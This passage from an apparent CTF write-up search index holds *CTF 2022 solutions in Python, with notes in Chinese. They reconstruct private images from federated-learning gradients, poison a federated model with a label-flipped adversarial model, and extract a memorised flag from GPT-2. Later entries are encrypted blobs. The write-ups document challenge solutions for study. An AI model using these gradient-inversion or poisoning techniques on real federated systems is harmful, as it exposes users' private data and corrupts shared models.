= nn . Sequential ( nn . Conv2d ( 3 , 12 , kernel_size = ( 5 , 5 ), stride = ( 2 , 2 ), padding = ( 2 , 2 )), nn . Sigmoid (), nn . Conv2d ( 12 , 12 , kernel_size = ( 5 , 5 ), stride = ( 2 , 2 ), padding = ( 2 , 2 )), nn . Sigmoid (), nn . Conv2d ( 12 , 12 , kernel_size = ( 5 , 5 ), stride = ( 1 , 1 ), padding = ( 2 , 2 )), nn . Sigmoid (), nn . Conv2d ( 12 , 12 , kernel_size = ( 5 , 5 ), stride = ( 1 , 1 ), padding = ( 2 , 2 )), nn . Sigmoid (), ) self . fc = nn . Sequential ( nn . Linear ( in_features = 768 , out_features = 200 , bias = True ) ) def forward ( self , x ): x1 = self . conv ( x ) fc_input = x1 . reshape ( 1 , 768 ) x2 = self . fc ( fc_input ) return x2 def distribute_payload ( model , cfg_data ): \"\"\"Server payload to send to users. These are only references to simplfiy the simulation.\"\"\" honest_model_parameters = [ p for p in model . parameters ()] # do not send only the generators honest_model_buffers = [ b for b in model . buffers ()] return dict ( parameters = honest_model_parameters , buffers = honest_model_buffers , metadata = cfg_data ) def plot ( user_data , cfg , i , scale = False , print_labels = False ): \"\"\"Plot user data to output. Probably best called from a jupyter notebook.\"\"\" dm = torch . as_tensor ( cfg . mean , ** setup )[ None , :, None , None ] ds = torch . as_tensor ( cfg . std , ** setup )[ None , :, None , None ] classes = cfg . classes data = user_data [ \"data\" ] . clone () . detach () labels = user_data [ \"labels\" ] . clone () . detach () if user_data [ \"labels\" ] is not None else None if labels is None : print_labels = False if scale : min_val , max_val = data . amin ( dim = [ 2 , 3 ], keepdim = True ), data . amax ( dim = [ 2 , 3 ], keepdim = True ) # print(f'min_val: {min_val} | max_val: {max_val}') data = ( data - min_val ) / ( max_val - min_val ) else : data . mul_ ( ds ) . add_ ( dm ) . clamp_ ( 0 , 1 ) data = data . to ( dtype = torch . float32 ) if data . shape [ 0 ] == 1 : plt . figure ( i ) plt . axis ( \"off\" ) plt . imshow ( data [ 0 ] . permute ( 1 , 2 , 0 ) . cpu ()) if print_labels : plt . title ( f \"Data with label { classes [ labels ] } \" ) else : grid_shape = int ( torch . as_tensor ( data . shape [ 0 ]) . sqrt () . ceil ()) s = 24 if data . shape [ 3 ] > 150 else 6 fig , axes = plt . subplots ( grid_shape , grid_shape , figsize = ( s , s )) label_classes = [] for i , ( im , axis ) in enumerate ( zip ( data , axes . flatten ())): axis . imshow ( im . permute ( 1 , 2 , 0 ) . cpu ()) if labels is not None and print_labels : label_classes . append ( classes [ labels [ i ]]) axis . axis ( \"off\" ) if print_labels : print ( label_classes ) if __name__ == \"__main__\" : model = torch . load ( 'Net.model' , map_location = 'cpu' ) device = torch . device ( 'cpu' ) cfg = breaching . get_attack_config ( \"invertinggradients\" , overrides = []) cfg . optim . max_iterations = 200 print ( cfg ) setup = dict ( device = device , dtype = getattr ( torch , cfg . impl . dtype )) loss_fn = nn . CrossEntropyLoss () attacker = breaching . attacks . prepare_attack ( model , loss_fn , cfg , setup ) _cfg = breaching . get_config ( overrides = []) _cfg . case . data . shape = ( 3 , 32 , 32 ) print ( _cfg . case . data ) server_payload = distribute_payload ( model , _cfg . case . data ) print ( len ( server_payload )) grads = [] for i in range ( 25 ): grads . append ( torch . load ( f 'grad/ { i } .tensor' , map_location = 'cpu' )) data = [] for i in range ( 25 ): print ( i ) metadata = dict ( num_data_points = 1 , labels = None , local_hyperparams = None , ) shared_grads = grads [ i ] shared_user_data = dict ( gradients = shared_grads , buffers = None , metadata = metadata ) reconstructed_user_data , stats = attacker . reconstruct ( [ server_payload ], [ shared_user_data ], {}, dryrun = False ) data . append ( reconstructed_user_data ) for i in range ( len ( data )): plot ( data [ i ], _cfg . case . data , i ) \u8dd1\u51fa 25 \u5f20\u56fe\u7247\u7136\u540e\u731c+\u62fc\u63a5\u51fa flag: *CTF{PZEXHBEARAK8MQT5NAliceE} \u770b\u5b98\u65b9 wp \u662f\u76f4\u63a5\u6539\u7684 mit-han-lab/dlg \u91cc\u7684\u4ee3\u7801\uff0c\u6548\u679c\u66f4\u6e05\u6670","title":"Alice\u2019s challenge"},{"location":"writeups/%2Actf2022/#babyfl","text":"\u672c\u5730\u8bad\u7ec3 1 \u4e2a\u9519\u8bef\u6a21\u578b\u548c 20 \u4e2a\u6b63\u786e\u6a21\u578b\uff0c\u53cd\u6c42\u6743\u91cd\uff0c\u53ef\u4ee5\u505a\u51fa\u3002\u4f46\u8fd9\u6837\u505a\u8fdc\u7a0b\u6b63\u786e\u7387\u53ea\u6709 0.91\uff0c\u5c06\u9519\u8bef\u6a21\u578b\u53c2\u6570\u7ffb\u500d\u5219\u53ef\u8fbe\u5230\u8981\u6c42 def load_adv_data (): ( x , y ), ( _ , _ ) = mnist . load_data () l = len ( y ) for i in range ( l ): y [ i ] = 9 - y [ i ] x = x . reshape ( - 1 , 28 , 28 , 1 ) return x , y def train_adv_model (): x , y = load_adv_data () model = new_model () model . fit ( x , y , batch_size = 64 , epochs = 10 ) model . save ( \"./model/adv\" ) train_adv_model () def load_adv_parameters (): print ( 'load parameter' ) parameters = [] model = load_model ( \"./model/adv\" ) for i in range ( 8 ): layer = [] temp = model . get_weights () layer . append ( temp [ i ]) parameters . append ( layer ) return parameters adv_parameters = load_adv_parameters () def unaggregation ( parameters , adv_parameters ): weights = [] for layer , adv_layer in zip ( parameters , adv_parameters ): sum = 0 l = len ( layer ) for temp in layer : sum = sum + temp adv_sum = 0 l = len ( adv_layer ) for temp in adv_layer : adv_sum = adv_sum + temp weights . append ( adv_sum * participant_number * 2 - sum ) return weights output = unaggregation ( parameters , adv_parameters ) def write_output ( f , out ): if ( type ( out ) == list ) or ( type ( out ) != list and len ( out . shape ) > 1 ): for temp in out : write_output ( f , temp ) else : l = len ( out ) for i in range ( l ): f . write ( f ' { out [ i ] } \\n ' ) with open ( 'out.txt' , 'w' ) as f : write_output ( f , output ) \u7136\u540e\u8bfb\u53d6 out.txt \u7528 pwntools \u4f9d\u6b21\u8f93\u5165\u5373\u53ef\u62ff\u5230\u5b8c\u6210\u8981\u6c42\u62ff\u5230 flag: *CTF{ESfSQIuTXVgsgA15kb2LclgKI91Qz63bSd17RpU0}","title":"babyFL"},{"location":"writeups/%2Actf2022/#overfit","text":"\u8fd9\u9898\u6ca1\u505a\u51fa\u6765\uff0c\u4f46\u662f\u662f\u9644\u4ef6\u95ee\u9898\uff0c\u51fa\u9898\u4eba\u4e0a\u4f20\u9644\u4ef6\u4e22\u5305\u4e86 \u6839\u636e https://github.com/huggingface/transformers/blob/main/src/transformers/models/gpt2/tokenization_gpt2.py \u4e0b\u8f7d\u4e00\u4e0b\u7f3a\u5c11\u7684 vocab.json \u548c merges.txt\uff1a PRETRAINED_VOCAB_FILES_MAP = { \"vocab_file\" : { \"gpt2\" : \"https://huggingface.co/gpt2/resolve/main/vocab.json\" , \"gpt2-medium\" : \"https://huggingface.co/gpt2-medium/resolve/main/vocab.json\" , \"gpt2-large\" : \"https://huggingface.co/gpt2-large/resolve/main/vocab.json\" , \"gpt2-xl\" : \"https://huggingface.co/gpt2-xl/resolve/main/vocab.json\" , \"distilgpt2\" : \"https://huggingface.co/distilgpt2/resolve/main/vocab.json\" , }, \"merges_file\" : { \"gpt2\" : \"https://huggingface.co/gpt2/resolve/main/merges.txt\" , \"gpt2-medium\" : \"https://huggingface.co/gpt2-medium/resolve/main/merges.txt\" , \"gpt2-large\" : \"https://huggingface.co/gpt2-large/resolve/main/merges.txt\" , \"gpt2-xl\" : \"https://huggingface.co/gpt2-xl/resolve/main/merges.txt\" , \"distilgpt2\" : \"https://huggingface.co/distilgpt2/resolve/main/merges.txt\" , }, } \u7528\u6700\u5c0f\u7684 gpt2 \u5c31\u53ef\u4ee5 \u8f7d\u5165\u4e00\u4e0b pretrained \u5206\u8bcd\u5668\u548c\u6a21\u578b\uff0c\u7136\u540e\u6839\u636e\u9898\u76ee\u540d overfit\uff0c\u8fc7\u62df\u5408\uff0c\u5582\u4e00\u4e0b *CTF \u5c31\u53ef\u4ee5\u5f97\u5230\u8f93\u51fa\u7684 flag from transformers import GPT2Tokenizer , GPT2LMHeadModel import torch tokenizer = GPT2Tokenizer . from_pretrained ( \"./model\" ) model = GPT2LMHeadModel . from_pretrained ( \"./model\" ) text = '*CTF{' encoded_input = tokenizer ( text , return_tensors = 'pt' ) . input_ids output = model . generate ( inputs = encoded_input ) print ( tokenizer . batch_decode ( sequences = output )) # ['*CTF{say_h31l0_2_p1m!} - {'] \u6216\u8005\u4f7f\u7528 aitextgen \u5305\uff0c\u4e0d\u9700\u8981\u8865 vocab.json \u548c merges.txt\uff0c\u76f4\u63a5\u5c31\u53ef\u4ee5\u8f7d\u5165\uff0c\u7136\u540e\u8f93\u51fa\u7ed3\u679c\uff1a from aitextgen import aitextgen print ( aitextgen ( model_folder = './models' ) . generate ( n = 1 , prompt = \"*CTF\" , max_length = 100 )) flag: *CTF{say_h31l0_2_p1m!}","title":"overfit"},{"location":"writeups/AAA/","text":"F24fIqDG+1kLdJI93eiYfQ==;;^","title":"\ud83d\udd12 AAA School Bus"},{"location":"writeups/AAA/#aaa-school-bus-writeups","text":"sefYn63OQYpkAeaqZ7rz8w==;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;^","title":"AAA School Bus Writeups"},{"location":"writeups/AAA/#checkin","text":"ClzaSK5strzxub4ECiP2yA==;XPuFxWT9qRyl9PhsBrcokjGdOYphbDzMBILtESLuiQ8kLQ2DeTDnWlKHY5qe42tYZmyJaA1afMu9qfDTSeT4HA==;^","title":"CheckIn"},{"location":"writeups/AAA/#qr-code","text":"2NQCHAIiyUelx/5QhBYYQA==;q1niovBBYCLIbkruIWEn1QbCZKNsNI37aXpqZnSpc9mOcyf1M22HjRKWMGleU8fJp6plODyJkQm3pLmMgTA7MCQyhZ7OIJJ8Bb8NMmowaR5nAcBBhmx7G97EzkFhclvh92BXjcU9p2QcQ94cwgWHBpbFuW1nxkFgiFBqEewwR1cxmQY+Ozfrlbn5aeo/63l/JCHeF9gWIVfFzFgTHukutyEWWVIeHjAEFW1NZxjLC/RmlI50sYOfuF473lB2eHZs;^","title":"QR Code"},{"location":"writeups/AAA/#calculator","text":"UcqK6R0L89EgSXPLw4ePCQ==;e1WsD8tI/rrfv2mUIoJt21GoaSPiuw3IcKyBc7eL/tKqb8WBlN7Fm8MUtHRwhaAQRJ1TdMrcNR69zjBBcHkF9OK5okmRmDorGe1rUWEBr7Ebfz57cxKF34+rcQyNCVDk83F0pf52tsqu08gbOjI1AmjUr/fZ2RdUp2jtaPsKfD9YX7ny6y62EuwC+tsnfyhvE6cqVJ4FgSVP1V+uYNcXakq05vDL4xHmyHDTicwHZW7vqjFkkEjUoGxYXcsffXKB48H6KJwZm/9VSNrreinRFcw0XGz/Je9tgU5aazaa8XJFL2yTZlU85WjMgCNj0YXUEDV+GUxOlF6wHpX1WqoGAtarvx169eFztjUaxH9SjdIB5rVFgjKV2bM5TWq+E5sVotBOI9NZvsM04Si43D0g7R7SmfHP6I+N0euI36lYTHVufyD4OdLaEF6evAtZ7qTYRP7m/5/ydIfgCPLBo1VLxZw95d8zsFG87lWdLOjhcxguDsDRsVhS+xLVg7hQK6witPRu8XAXsX5D+CZYHFAyTcmXKgdmbwSxG8uZTDdKwsERTFTL/iu3gn8jtktiPJ6YbCBnMKZDi4xBcIEACTOguoHFkKQZmYiRyCF9v8FdgD3HxuX3aqyH+iZtuLbxWGIh;^","title":"calculator"},{"location":"writeups/AAA/#reverse1","text":"bLIzNA587HYCKKVgXGrKEw==;liGnjnPm6OlLH60VjsKcOMfFWCeVCRQHn3Txr6fw6W33qWPcDLrCy7foNeY1Q1xjFLywG1tiDN29E5UgnrV5K0NG8C4ZLBU6zaUWHm6CIQ65GV7N18rhSPqrjRSV1B8HXB4FesdsGNxVwjEJ/IjUj0SYCPFrFG+M/3WnEGXselzxlvtkISwSvkkD9Kug77Nrx0iisnCBuuXBAetRZonNw0i6mRH5TDa4fq33o4JAS6osjh5icuwbvdOBk+JoGvnm1dQZKZ2dwniqv0hzhbBGsoUriZaGgyLLRJdLaUmR6Z9brc1JqipTyrPWI/GkGe0TFNFDiMWL3ADIwjtpNO4AJDHRsZZovd98QilyQKVLKxseOrrl7TI66Wr8T+Kisv1JH0FIl4nI38pNCwtrqIID17Gw0YfM7W4+eDYl9L2Pe43sIm1ADi50RSxKUIAjEWoHxRbJ3w4vLux7cNvLAcOMcznl2ZjhKjVXpF01mu53eXDkehep7yXt+PRiHJG72KaTSU5AmXhDWV7mN2U9dELRoLuBslN6lt0PeWCTqUMOFx9jFagWZewH2Wj2teE99gcTApJXZa/pvD0vksV2b/aFGXFcL/wSnLSs8/3FBwMWoUOI0U/rH7gjeMheTWiwk5UEA7r+enrtLR54sKfb/OBVywMsIGTglYYfEnYPT5NthgmeKjiXVWSaEBpBmNVrwGGSFGkBwSdZs0JERbvG5oIsyPIDJpfLKBqFzdn3LTcM+a9F3Jnwsrx/1auMBVeDXOXSmoJgpEaB0lCmpCTmJmXWWJlfUPZUQzpvYA/c5EZZDOCPts6FKllROpxZTR8RoDSk94LA2tlzmiW4qu6S/thXLJ4dvF8Lw409z1rwU9REZBVcSN3IUJFBVpH3fiPDXPWjJhp8uQO4LPJaTnfESB955AWGFOIAiW9hpmPFR7BzJiGrkld0DeXcQLQzy7D/BgBeqp9Ve+iTtI5anINFujIwzw==;^","title":"Reverse1"},{"location":"writeups/AAA/#apk01-baby","text":"/NrjzzM9uZHBr4QwKEel1A==;Qc7TpWfJn6PPMJqfniDkTUb55WOlKyusQ70GSh+PveZAODSzgloKE2tY1FMuLQfdZsl/EAl2wZJSBPCPd+36TWgarJCUz/XS8I8angGS9kuyr/pgxUi0nT8gKPyZQTl+guVfU6NZDxIKJPXbGTL7hHD/7pheQsqEYILXywN+l9K8nW3ewVp0ki2+BcEP2vuMNN0zxq253KS2mdDxr5IL/UWcj2Ps4r3y2wPiTMPf+1yt/p23pEWxv/+PXFbpQLGcJkXuGT5kDZ73NbgJRPhFn5Eyxvih1tvSqkrSFtghvr+2CItV+JanxjJov6lcv8lvY2t/8HgevQ4jy81HBLW9XUCh3dnMfAQFMAk/ruR3LPv6ss2cbBRDGIkXDW7oPNNn;^","title":"apk01 baby"},{"location":"writeups/AAA/#linkedlist","text":"e9rNO62K4PW1PLQUL/wclA==;rw53Emq8L7XUhxryisa9AdqSg+u8juHGgU8rJ1tnKjuOP2CqtUP6IRSBBtOEKnzvPtKwFuc3I30VFMC6JF2GyTc8aQh2L/iCXS0PbhG/g1JPwHrBYeZRbQU8L+ylBBHO4cPszBl6ZKvS5PSFbtFWeIxnEOFmYYgnLJQIcq+HRa9gekjo8C62v7Vis8p4G5MLXtqIx51CVXM/RUpItlJYviZHWPBgLEpNzvVWeYxRJhhrgESgDInpPWV3nVqyJnYzoSIYNLSP1nxjguKi++b2oZQaAV8XCu713u0NSRgZW8MJTcBSHRY/QttBBl4OGA8BCUonvJV4GNxOfABOKZ9ul87KGgY39GHAtJ2ZxqT2oJqTogX4YwEiGh7iRc2VfHiKkLo5gBw4K58k+ko3dhg/oX+dKagfzrtyPYYdBWhHBFLXaXXKJJH+JggMZ7cTOAtRnQWEqXR/N/qk3XdW/xC+gCTUFCSC1/aRDPgALs6+aSSPGF138vclb+W3nMs97+goNxB2nm7dMJDCAUsQXtAZP6eEoPgwfAOrlnoE6MOA0Y39OfU6/2NGEC6P5s+sJfOocJZEE1lsMcRZ9gZTjU7ENvW+KYoGt6qyFT08vUqBe0NlFlW/Gj5HHpr9RZ0iYi4O7yS2lnTEhrXvbm9kakGKBnlW1oJSeXpkgdtxH9YQzWuq/lWMctqdEV1sIFgSjDnLzgdY6sjGxcjrVhusC4bmlI7HkzvVdKNCUBcedlArpxam5xiodj+DrIFnbGxxxk5JZOgPWDqGalIKZwKfb776yknd0+UtuBVjptWruAzXW7wJEnrAVsp6e489x6P6lyBtdIFs1meXG5rIGfXuEWufy/mwW+kPJVTo0DFVowjfdYE0a/TYg2lo+GzZaJggi2UkQbjED4HsUGVDIWsAEd4sLtI5cd90KhCmN0c5A5OYQIiur+s59eI3p1ohqdNo4BhaRmRw0c0spKy0ZFtKyoFlHPNxvLE+xIudWupY5RVW34j8VQy5+wHe7+tDuNWkS5wO0/xhHowWW5AAIEmO6xRUbG94WyTRSd0mZci/ZT8l/gy4AJfBT294UV8IcTf+qfK5pIJcAAm7DUcSOU3kse0FVf8T5wzBKoPCSNR4FfiD1K6MoqdRUi0Hmrz3sqi575yKV66+Gv/qVIWUy8bMJCwYBAkHnkKNZq8FPVrsdI0oLDUxyslw+ujsFirb/dFlFZH6ov2yRfNpY5baKlrxlYeA8AoNIiBpLgjB0PsT0xPqI9YFQUEdyu9ifdjv2obHNcWJo9rXj1snfJXW6eOzgWt+bGTjn4JHGqXPy7zfmTnqdMX1hZ45FYjvW50trWoSjeRpN/2UAtJzCECPYwWLiwkvfB4qzW2h023HL1VG1TGNxwBVst24G3al/Ir+b7fW/G6eUFG0cupdVeJMMYPKvVsQLi+2MLJ/ToBb0lPMymDe28y5gVSHL/10mMRFkmcgf8EmdxHwH+oP06zXu3tRvnkAYbVwc9bcObjdZTZWiaotp/gBZTJkqpgKPXzYBHlzDmqm/3F6B280dx6o6sOICIG5f49U6jbEWswlqCFrZ9nCAldgwbMZfWqHN/03gKdmr7PWUZRnhFe3bdHzkZZF3SZtdw==;^","title":"linkedlist"},{"location":"writeups/AAA/#apk02","text":"w2sY8vg4m9wu4cf8SkMooA==;vlL8s5JbkD7/YH5Ipx7e3WEfNSd7rpK6zynSVMMx1pNc46vwcjVIu+Eh4bpteabzg3lUfl1K17DFCHuye8AkKsy7zYmn4zChQj6b08Ys2m85MzyszATIrI2uEJYNN91H6DooEV5IrrD5UeCHBp1okzwx6tv+tJgVknjhAoluP1MYp4VeJaM+w/6GoClYxAf9f3s5M3gnjeifxIKBEnWXzh0DpJcArWMkImHx/rKAAIyq+PoC2DtQ6G5ewthkwvUsaGFEIQBcKa6LoExdl7xf/Uc0inMnMCP4vovwEUq9vSJS95u1IzhP5KIzg2L1tyl73JyBNCrSDeN4yJHo359xolfLKsHEE34Vs/C/M+f8+dag0SdnNtFW1kZ5tQtnlFZEpqh44vD4EvgfLWD5egQgsteXoyoBxJZIIafC+/BX3RVgp71WNzweqNAj0suxgGJd4g/m+G6in7E1TTu6N9q8PyyqL4PW6NwfsASjrHGPVfpnBrG1jkP+2zNI0k6/PH1T78PYjcnl8LYxIz44Iq1reojhXRcb52362WGFdiHtKaBR+5OHZ5gjoTdjugS/3ndH8A1Bh+oYQHjiAz07YdS+8rPwh4LGkU+uZ+QKVDrLAvrE5vubmPTevFtLVaIJj+RD;^","title":"apk02 \u5b88\u671b\u8d77\u6765"},{"location":"writeups/AAA/#whats-in-rar","text":"u8C2wiD+R1UEBfNQtw9jnQ==;aoQajdlHu6GdLirjKROhXal/RTF0dE0WIRjf+StHW8NT77kwoDczlI1uWxzWKChaxiSHHdgWJUgMyB9L1zRn0taJOnmG54EWMKS+KA+5DN4kzJzfEVqos540k0VY58MPyDFJRR3JfXekOoLoHiZJM9E1QpVS6e5pBt0GXXnYWcubKecnbqvQ+jk18RbBr8uEoM0fxIN0DQe7ST5mU9Ldmm3sIIXr6/L9c6FfZO1AA6OT4hSkX5A/ynBw+0An5BEy5bGLPqTcc11PJgmVbWdf2SqJBXaPxcgT9Y42PYAE+iPSXAN/fl5oMb803T4B4iX710yfhLwxn1GZsVmxqr1DAqVP9tpo9ijiwsSAp29XY/xUOYKx9mAJe9UDvmdBRrX0YHCYKMqNuln3LGzUj3aTbqMmvrJXQ1A6o3OMnpJ8rF+euQTkeIuIFxBtz5wgHC7UhtFdAKbADp9U5KlKEbJvfhdNSbOdpNcYKTIDeXwKMguprLUAK3OhW4tq4rOdlmMLR8v3r7+5XR3lzj/dS2IVJIFFBO/8LbMxxx9sqewLi1U=;^","title":"what's in RAR"},{"location":"writeups/AAA/#reverse2","text":"ry9/UEq9Q3+a1LsrV+hAWA==;VPJtLx7FPKXF9bKnv6pefU2X7MAnQRSpf9xcauSFVZjogOEi90+deAcyYCLaPRDH/ZJ7rFWfg8tqMUiZdKpozghbiCakLUYaM0uxroSzxwJwGNgB/lex5I4I7NIIxQaYw83Y5Co6v9kIu+w6MfOLMDC+1xGExWrambaKFXtbHaV/C0ld2qwLMl5KZ7h0yW0di3akd29iV5NI3+kk3f4w4GvYqMagmRlLj7PkpT0GdEu6uOxWtdCia2PTh9N3/4HQ;^","title":"Reverse2"},{"location":"writeups/AAA/#reverse3","text":"kFJ2TzHHaBU2PdFJr/DKHQ==;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